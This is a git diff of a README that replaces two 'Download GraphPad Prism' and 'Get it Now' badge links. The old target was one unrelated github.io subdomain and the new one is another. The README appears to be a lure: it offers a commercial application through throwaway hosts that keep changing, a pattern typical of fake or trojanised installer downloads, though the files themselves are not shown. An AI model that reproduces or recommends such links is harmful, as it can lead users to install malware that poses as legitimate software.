@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://urinoterapia-sigma.github.io/.github/graphPadPrism">
+  <a href="https://six-sevens.github.io/.github/graphPadPrism">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download GraphPad Prism"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The nonlinear curve fitting capability is technically the most sophisticated asp
 
 <p align="center">
 
-[![Get it Now GraphPad Prism](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/graphPadPrism)
+[![Get it Now GraphPad Prism](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/graphPadPrism)
 
 </p>
 
